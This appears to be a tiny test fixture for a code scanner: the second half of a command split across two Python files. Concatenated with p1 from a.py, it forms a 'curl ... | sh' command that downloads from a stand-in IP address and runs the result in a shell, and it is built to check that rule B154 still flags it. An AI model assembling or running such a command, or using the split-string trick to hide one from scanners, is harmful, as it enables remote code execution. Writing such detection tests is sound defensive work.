"""bad_f105_split_command: second half — neither this fragment nor a.py's alone reads
as a URL; reassembled they form a runnable curl|sh command (B154 fires)."""
from a import p1

p2 = "tp://1.2.3.4/x|sh"
full = p1 + p2
